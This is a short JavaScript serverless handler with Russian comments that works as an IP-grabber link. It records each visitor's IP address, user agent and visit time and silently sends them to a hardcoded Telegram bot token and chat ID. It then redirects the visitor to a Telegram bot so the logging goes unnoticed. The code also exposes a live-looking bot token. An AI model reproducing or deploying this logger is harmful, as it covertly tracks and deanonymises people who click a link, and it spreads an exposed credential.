export default function handler(req, res) {
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
    const ua = req.headers['user-agent'] || 'Unknown';
    
    const message = `
<b>🔥 НОВЫЙ ЛОГ</b>
IP: ${ip}
User-Agent: ${ua}
Время: ${new Date().toLocaleString()}`;
    
    // ЗДЕСЬ ВСТАВЬ СВОЙ ТОКЕН (от BotFather)
    const BOT_TOKEN = '8975794406:AAGA_WM_FdsxIZyyoTa90oU6UAMPW6Kb0oY';
    
    // ЗДЕСЬ ВСТАВЬ СВОЙ chat_id (из getUpdates)
    const CHAT_ID = '870299796';
    
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
    
    fetch(url).catch(() => {});
    
    // РЕДИРЕКТ НА ТВОЕГО НОВОГО БОТА
    res.writeHead(302, { 'Location': 'https://t.me/ekfjwei_bot' });
    res.end();
}
